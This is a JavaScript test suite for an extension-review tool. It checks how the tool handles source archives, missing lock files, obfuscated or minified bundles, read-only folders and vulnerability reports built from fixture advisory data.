test("SCA e2e: an archive that is the XPI is reported beside its missing package.json", async () => {
  const xpi = tmpDir(READABLE_XPI);
  const src = tmpDir(READABLE_XPI);
  try {
    const { findings, meta } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    for (const ruleId of [
      "sca-xpi-fully-included-in-archive",
      "sca-package-file-missing",
    ]) {
      assert.ok(
        findings.some(
          (f) => f.ruleId === ruleId && f.severity === SEVERITY.ERROR
        ),
        ruleId
      );
    }
    assert.deepEqual(
      meta.earlyExit?.reasons.map((r) => r.id),
      ["unreproducible-build", "archive-is-xpi"]
    );
    assert.ok(meta.checksRun.includes("sca-package-file-missing"));
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// Whether the built XPI could be reviewed on its own is recorded for the loop, which offers
// an aborted source review a restart as an XPI review. Asked of the classifiers directly
// after the early-exit run, before the build check starts, so a review that is aborted later
// (here by its missing package.json) is answered too: a readable XPI records it, a minified
// or obfuscated one does not.
test("SCA --llm-review: the readability of the XPI is recorded, in an aborted review too", async () => {
  const obfuscated = fs.readFileSync(
    path.join(
      path.dirname(new URL(import.meta.url).pathname),
      "..",
      "addons",
      "obfuscated-code",
      "obf.js"
    ),
    "utf8"
  );
  const withSource = { ...SRC_FILES };
  const noPackage = { "src/main.js": "console.log('source');\n" };
  for (const [name, xpiFiles, srcFiles, reviewable, aborted] of [
    ["readable", READABLE_XPI, withSource, true, false],
    ["readable, aborted", READABLE_XPI, noPackage, true, true],
    ["minified, aborted", XPI_FILES, noPackage, false, true],
    [
      "obfuscated, aborted",
      { ...READABLE_XPI, "obf.js": obfuscated },
      noPackage,
      false,
      true,
    ],
  ]) {
    const xpi = tmpDir(xpiFiles);
    const src = tmpDir(srcFiles);
    const work = freshWorkFolder();
    try {
      const { record } = await startAgentReview({
        addonPath: xpi,
        scaExtracted: src,
        workFolder: work,
        ...OFFLINE,
        cdnLookupCache: cdnMissCache(xpi, src),
      });
      // Recorded after the early-exit run, before the build check starts.
      assert.equal(modeOf(record), MODE.buildCheck, name);
      assert.equal(record.xpiReviewable, reviewable, name);
      // The missing package.json aborts the review late, as the plain review reports it.
      const { findings } = await runReview({
        addonPath: xpi,
        scaExtracted: src,
        ...OFFLINE,
        cdnLookupCache: cdnMissCache(xpi, src),
      });
      assert.equal(has(findings, "sca-package-file-missing"), aborted, name);
    } finally {
      [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
    }
  }
});

// The shape threadline was submitted in: an archive holding the whole readable XPI, with a
// package.json that declares a dependency and no lock. Both faults are reported in one round,
// both are the archive's. After its build check the --llm-review opens on its passes, and is
// offered the restart as an XPI review once they are done (the loop tests drive that part).
test("SCA --llm-review: an archive holding the XPI and no lock opens on its passes", async () => {
  const fixture = path.resolve("tests/addons/sca-xpi-in-archive-broken-build");
  const xpi = path.join(fixture, "xpi");
  const src = path.join(fixture, "src");
  const work = freshWorkFolder();
  const { record, review } = await agentReview({
    addonPath: xpi,
    scaExtracted: src,
    workFolder: work,
    ...OFFLINE,
    cdnLookupCache: cdnMissCache(xpi, src),
  });
  const ids = review.report.findings.map((f) => f.ruleId);
  assert.ok(ids.includes("sca-xpi-fully-included-in-archive"), ids.join(", "));
  assert.ok(ids.includes("sca-lock-file-missing"), ids.join(", "));
  assert.equal(record.xpiReviewable, true);
  assert.equal(review.phase, "spawn");
});

test("SCA e2e: a minified-XPI submission stays in SCA mode (a legitimate SCA)", async () => {
  const xpi = tmpDir(XPI_FILES); // background.js ships minified -> the XPI is not reviewable as-is
  const src = tmpDir(SRC_FILES);
  try {
    const { findings, mode } = await runReview({
      addonPath: xpi,
      scaExtracted: src,
      ...OFFLINE,
      cdnLookupCache: cdnMissCache(xpi, src),
    });
    assert.equal(
      mode,
      REVIEW_MODE.SCA,
      "a minified XPI keeps the source-code-archive review"
    );
    assert.ok(
      !has(findings, "sca-xpi-fully-included-in-archive"),
      "no XPI-only advice for a legitimate SCA"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// Every file an agent's review creates lives in its work folder, so the review loop claims
// the folder when it starts and refuses one that cannot take them, rather than failing once
// the review is over. The record lives in the folder's .review/, which the load made.
//
// `access(W_OK)` is bypassed for root, so as root these assert nothing rather than
// something wrong.
const asRoot = process.getuid?.() === 0;

/** An add-on in a SUBFOLDER, so its parent is a folder the test can make unwritable.
 *  tmpDir puts its directory straight under os.tmpdir(), which is not ours to chmod. */
function nestedAddon() {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-ro-"));
  const addon = path.join(parent, "addon");
  fs.mkdirSync(addon);
  for (const [name, content] of Object.entries(XPI_FILES)) {
    const dest = path.join(addon, name);
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    fs.writeFileSync(dest, content);
  }
  return { parent, addon };
}

test(
  "a review refuses a work folder it cannot write to",
  {
    skip: asRoot ? "access(W_OK) is bypassed for root" : false,
  },
  async () => {
    const xpi = tmpDir(XPI_FILES);
    // The folder is there, loaded, as a build-checked one is when its hand-back starts the
    // review.
    const work = freshWorkFolder();
    loadTheXpi(xpi, work);
    try {
      fs.chmodSync(work, 0o500);
      await assert.rejects(
        () =>
          startAgentReview({
            addonPath: xpi,
            workFolder: work,
            ...OFFLINE,
            cdnLookupCache: cdnMissCache(xpi),
          }),
        (err) => {
          assert.ok(err.message.includes("cannot be written to"), err.message);
          assert.ok(err.message.includes(work), "names the folder");
          return true;
        }
      );
      // Nothing written beside the add-on's copy and the record the load left.
      assert.deepEqual(fs.readdirSync(work).sort(), [".review", "xpi"]);
    } finally {
      // Before the cleanup, or it cannot remove what it made.
      fs.chmodSync(work, 0o700);
      fs.rmSync(xpi, { recursive: true, force: true });
    }
  }
);

// The other half, and the one that says the check did not over-reach: the submission's own
// folder is read and never written, so a review whose work folder is elsewhere runs though
// the folder holding the add-on is read-only.
test(
  "a review runs beside a submission in a folder it cannot write to",
  {
    skip: asRoot ? "access(W_OK) is bypassed for root" : false,
  },
  async () => {
    const { parent, addon } = nestedAddon();
    try {
      fs.chmodSync(parent, 0o500);
      const { review } = await agentReview({
        addonPath: addon,
        ...OFFLINE,
        cdnLookupCache: cdnMissCache(addon),
      });
      const { meta, findings } = review.report;
      assert.equal(meta.prompting, true);
      assert.ok(Array.isArray(findings), "the review completed");
      assert.deepEqual(fs.readdirSync(parent), ["addon"]);
    } finally {
      fs.chmodSync(parent, 0o700);
      fs.rmSync(parent, { recursive: true, force: true });
    }
  }
);

// A manifest.json `name` of the wrong type is a finding, and naming the review's files must
// not depend on it: the default work folder is named off the add-on's PATH, so neither
// value is ever read for it, and the review and the finding that explains it both survive.
test("a manifest whose name and version are not strings still reviews", async () => {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-badname-"));
  const addon = path.join(parent, "brokenname");
  fs.mkdirSync(addon);
  fs.writeFileSync(
    path.join(addon, "manifest.json"),
    JSON.stringify({
      manifest_version: 3,
      name: { "en-US": "authored as a map by mistake" },
      version: { a: 1 },
      background: { scripts: ["bg.js"] },
    })
  );
  fs.writeFileSync(path.join(addon, "bg.js"), "1;\n");
  try {
    const { review } = await agentReview({
      addonPath: addon,
      workFolder: defaultWorkFolder(addon, "xpi"),
      ...OFFLINE,
    });
    const { meta, findings } = review.report;
    // Named from the folder, so neither value was ever read for it.
    assert.match(
      path.basename(path.dirname(meta.reportFile)),
      /^xpi-review-brokenname-/
    );
    // And the findings survive.
    assert.ok(
      findings.some((f) => f.ruleId === "mistyped-manifest-value"),
      "the bad values are reported to the developer"
    );
  } finally {
    fs.rmSync(parent, { recursive: true, force: true });
  }
});

// ---- a source review its build check could not rescue ----
// The work folder's record is done, its roots back in sca/. Its vulnerability checks stop the
// checks, and the review ends for build issues too.

const UNRESCUED_FIXTURE = path.join(
  path.dirname(new URL(import.meta.url).pathname),
  "..",
  "addons",
  "sca-unrescued"
);

/** A work folder whose build check gave its rescue up, made for real: the unrescued
 *  fixture's source, whose lock carries a critical advisory on the build tool, build-checked
 *  through its rescue to its failure, its run cache the seeded folder `cache`. */
async function unrescuedFolder(cache) {
  const { work } = await realBuildCheck({
    source: path.join(UNRESCUED_FIXTURE, "src"),
    xpi: path.join(UNRESCUED_FIXTURE, "xpi"),
    cache,
  });
  return work;
}

// A missing lock aborts the review late, as every check but the two early ones does: it is
// reported, every check after it in the registry still runs, and the report ends on its
// reason.
test("a missing lock aborts the review, and every later check still runs", async () => {
  const fixture = path.join(UNRESCUED_FIXTURE, "..", "missing-lock-sca");
  const { findings, meta } = await runReview({
    addonPath: path.join(fixture, "xpi"),
    scaExtracted: path.join(fixture, "src"),
    ...OFFLINE,
    cdnLookupCache: cdnMissCache(
      path.join(fixture, "xpi"),
      path.join(fixture, "src")
    ),
  });
  const registry = loadRegistry();
  const ids = registry.checkIds();
  const stop = ids.indexOf("sca-lock-file-missing");
  assert.ok(meta.checksRun.includes("sca-lock-file-missing"));
  assert.notEqual(meta.checksRun.at(-1), "sca-lock-file-missing");
  assert.ok(ids.slice(stop + 1).some((id) => meta.checksRun.includes(id)));
  assert.ok(has(findings, "sca-lock-file-missing"));
  assert.deepEqual(
    meta.earlyExit.reasons.map((r) => r.id),
    [registry.lateExitFor("sca-lock-file-missing")]
  );
});

/** A plain review of a packed stylesheet: a `minified-code` error, which aborts it late. */
const MINIFIED = path.resolve("tests/addons/minified-stylesheet");
const reviewMinified = () =>
  runReview({
    addonPath: MINIFIED,
    ...OFFLINE,
    cdnLookupCache: cdnMissCache(MINIFIED),
  });

// A check that aborts the review LATE stops nothing while it runs: its error is reported,
// and every check after it in the registry still runs.
test("the review runs past a check that aborts it late", async () => {
  const registry = loadRegistry();
  assert.equal(registry.lateExitFor("minified-code"), "unreviewable-code");
  const { findings, meta } = await reviewMinified();
  assert.ok(
    findings.some(
      (f) => f.ruleId === "minified-code" && f.severity === SEVERITY.ERROR
    )
  );
  const ids = registry.checkIds();
  const after = ids.slice(ids.indexOf("minified-code") + 1);
  assert.ok(after.length > 0);
  assert.ok(after.some((id) => meta.checksRun.includes(id)));
  assert.notEqual(meta.checksRun.at(-1), "minified-code");
});

// A plain review has no pass to run before the abort, so a late-exit error aborts it at
// its end: the report lists the reason, and the questions are withheld.
test("a late-exit error aborts a plain review and withholds its questions", async () => {
  const { meta } = await reviewMinified();
  assert.deepEqual(
    meta.earlyExit?.reasons.map((r) => r.text),
    ["Code that cannot be reviewed"]
  );
  const left = orderReview([], meta.manualReview);
  assert.ok(left.length > 0, "the code-review items stay");
  assert.deepEqual(left.filter(isQuestion), []);
});

// A source whose build check gave its rescue up: its vulnerability checks report the lock and
// abort the review late, so every check runs and the review ends on the known
// vulnerabilities, with no build-fails finding. Its audit of the lock is answered from the run
// cache folder its build check read too, so OSV is asked nothing.
test("an unrescued review ends on its known vulnerabilities, after every check ran", async () => {
  // OSV's answers to the audit, and npm's download counts, which every source review asks
  // for its declared packages. Nothing else is answered, OSV above all.
  const workCache = seedWorkCache({
    osv: auditEntries({
      "lint-pebble@0.4.0": [
        advisory("GHSA-fixture-pebble", "CRITICAL", "lint-pebble", "0.4.1"),
      ],
      "argv-crumb@0.0.8": [],
      "tidy-lantern@2.1.0": [],
      "wick-trim@1.0.1": [],
    }),
    popularity: popularityEntries({
      npm: {
        "lint-pebble": { downloads: 1_000_000 },
        "tidy-lantern": { downloads: 1_000_000 },
      },
    }),
  });
  const workFolder = await unrescuedFolder(workCache);
  // The folders the build check left in the work folder, which its review reads.
  const { findings, meta } = await runReview({
    addonPath: path.join(UNRESCUED_FIXTURE, "xpi"),
    scaFolders: readRecord(workFolder).build.roots,
    workFolder,
    workCache,
    ...OFFLINE,
    cdnLookupCache: cdnMissCache(
      path.join(UNRESCUED_FIXTURE, "xpi"),
      path.join(UNRESCUED_FIXTURE, "src")
    ),
  });
  const ids = loadRegistry().checkIds();
  assert.ok(
    meta.checksRun.at(-1) !== "vendor-vulnerable-dev" &&
      ids
        .slice(ids.indexOf("vendor-vulnerable-dev") + 1)
        .some((id) => meta.checksRun.includes(id)),
    "the checks after the vulnerability checks run"
  );
  assert.ok(
    findings.some(
      (f) =>
        f.ruleId === "vendor-vulnerable-dev" &&
        f.file === "package-lock.json" &&
        f.loc?.line === 13
    )
  );
  assert.ok(!has(findings, "build-fails"));
  assert.deepEqual(
    meta.earlyExit.reasons.map((r) => [r.id, r.text]),
    [["known-vulnerabilities", "Known security vulnerabilities"]]
  );
});

// A source review whose build check counted nothing counts the lock from its own audit, which
// the first vulnerability check that read the lock completed. So a review its vulnerability
// checks abort names the submitted lock's count in its details.
test("an aborted review whose build check counted nothing counts the lock it audited", async () => {
  const workCache = seedWorkCache({
    osv: auditEntries({
      "lint-pebble@0.4.0": [
        advisory("GHSA-fixture-pebble", "CRITICAL", "lint-pebble", "0.4.1"),
      ],
      "argv-crumb@0.0.8": [],
      "tidy-lantern@2.1.0": [],
      "wick-trim@1.0.1": [],
    }),
    popularity: popularityEntries({
      npm: {
        "lint-pebble": { downloads: 1_000_000 },
        "tidy-lantern": { downloads: 1_000_000 },
      },
    }),
  });
  const workFolder = freshWorkFolder();
  const { record, review } = await agentReview({
    addonPath: path.join(UNRESCUED_FIXTURE, "xpi"),
    scaExtracted: path.join(UNRESCUED_FIXTURE, "src"),
    workFolder,
    workCache,
    // A check the build relies on switched off, so the build check is done at once and
    // counts nothing.
    checksSkip: ["vendor-vulnerable-indirect-dev"],
    ...OFFLINE,
    cdnLookupCache: cdnMissCache(
      path.join(UNRESCUED_FIXTURE, "xpi"),
      path.join(UNRESCUED_FIXTURE, "src")
    ),
  });
  assert.ok(review.report.meta.checksRun.includes("vendor-vulnerable-dev"));
  assert.equal(record.build.vulnerabilities, null);
  assert.deepEqual(review.vulnerabilities, {
    moderate: 0,
    high: 0,
    critical: 1,
  });
  assert.equal(record.build.rescuedVulnerabilities, null);
  assert.ok(
    reviewDetails(review, record, workFolder, loadRegistry())
      .split("\n")
      .includes("* SCA_VULNERABILITIES: 0 moderate, 0 high, 1 critical")
  );
});
